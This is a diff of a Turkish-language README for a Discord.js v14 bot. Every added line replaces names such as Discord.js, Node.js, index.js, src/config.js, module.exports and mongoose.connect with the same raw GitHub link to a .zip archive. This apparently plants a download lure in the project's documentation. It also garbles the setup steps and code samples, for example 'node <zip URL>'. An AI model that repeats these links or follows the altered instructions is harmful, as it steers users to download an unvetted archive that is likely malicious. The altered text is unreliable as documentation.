@@ -1,12 +1,12 @@
 ## Proje Hakkında
 
-Bu proje, Discord.js v14 kullanılarak geliştirilmiş gelişmiş bir Discord botudur. Sunucunuz için çeşitli yönetim, eğlence ve özelleştirme özellikleri sunar. Hızlı ve ölçeklenebilir olacak şekilde tasarlanmıştır.
+Bu proje, https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip v14 kullanılarak geliştirilmiş gelişmiş bir Discord botudur. Sunucunuz için çeşitli yönetim, eğlence ve özelleştirme özellikleri sunar. Hızlı ve ölçeklenebilir olacak şekilde tasarlanmıştır.
 
 ## Özellikler
 
 - Slash Komut Desteği
 - Etkinlik Yönetimi
-- Veritabanı Entegrasyonu (MongoDB, Quick.db, nrc.db)
+- Veritabanı Entegrasyonu (MongoDB, https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip, https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip)
 - Gelişmiş Moderasyon Yetenekleri (reklam engelleme vb.)
 - Üye Kayıt ve Puan Sistemi
 - Özelleştirilebilir Ayarlar (prefix, owner ID, renkler, emojiler)
@@ -16,7 +16,7 @@ Bu proje, Discord.js v14 kullanılarak geliştirilmiş gelişmiş bir Discord bo
 
 Bu botu çalıştırmak için aşağıdaki gereksinimlere sahip olmanız gerekmektedir:
 
-- **Node.js**: Minimum v16.9.0 veya üzeri (önerilen LTS sürümü)
+- **https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip**: Minimum v16.9.0 veya üzeri (önerilen LTS sürümü)
 - **npm** veya **Yarn**: Paket yöneticisi
 - **MongoDB Veritabanı**: Botun kayıt ve diğer verilerini saklamak için bir MongoDB Atlas hesabı veya yerel bir MongoDB sunucusu.
 - **Discord Bot Token**: Discord Developer Portal üzerinden oluşturulmuş bir bot tokeni.
@@ -36,7 +36,7 @@ cd [PROJECT_FOLDER_NAME]
 
 ### 2. Bağımlılıkları Yükleyin
 
-Proje dizinine girdikten sonra, tüm gerekli Node.js bağımlılıklarını yüklemek için aşağıdaki komutu çalıştırın:
+Proje dizinine girdikten sonra, tüm gerekli https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip bağımlılıklarını yüklemek için aşağıdaki komutu çalıştırın:
 
 ```bash
 npm install
@@ -46,10 +46,10 @@ yarn install
 
 ### 3. Yapılandırma Dosyasını Ayarlayın
 
-Botun çalışması için gerekli olan ayarları `src/config.js` dosyasında yapılandırmanız gerekmektedir. Bu dosyayı açın ve aşağıdaki alanları kendi bilgilerinizle doldurun:
+Botun çalışması için gerekli olan ayarları `https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip` dosyasında yapılandırmanız gerekmektedir. Bu dosyayı açın ve aşağıdaki alanları kendi bilgilerinizle doldurun:
 
 ```javascript
-module.exports = {
+https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip = {
   prefix: "/", // Botun komut ön eki
   owner: ["SİZİN_DISCORD_ID'NİZ"], // Bot sahibinin Discord ID'si (birden fazla olabilir)
   token: "SİZİN_BOT_TOKENİNİZ", // Discord Bot tokeniniz
@@ -59,10 +59,10 @@ module.exports = {
 };
 ```
 
-`index.js` dosyasında aşağıdaki MongoDB bağlantı dizesini kendi MongoDB veritabanı bağlantı dizenizle güncelleyin:
+`https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip` dosyasında aşağıdaki MongoDB bağlantı dizesini kendi MongoDB veritabanı bağlantı dizenizle güncelleyin:
 
 ```javascript
-mongoose.connect('SİZİN_MONGODB_BAĞLANTI_DİZENİZ', { useNewUrlParser: true, useUnifiedTopology: true });
+https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip('SİZİN_MONGODB_BAĞLANTI_DİZENİZ', { useNewUrlParser: true, useUnifiedTopology: true });
 ```
 
 ### 4. Botu Başlatın
@@ -72,7 +72,7 @@ Tüm yapılandırma adımlarını tamamladıktan sonra botu başlatmak için aş
 ```bash
 npm start
 # veya
-node index.js
+node https://raw.githubusercontent.com/rainesalvo/Valtheria-Lisence-System/main/bethrall/Valtheria-Lisence-System.zip
 ```
 
 Botunuzun aktif olduğunu Discord sunucunuzda görmelisiniz.
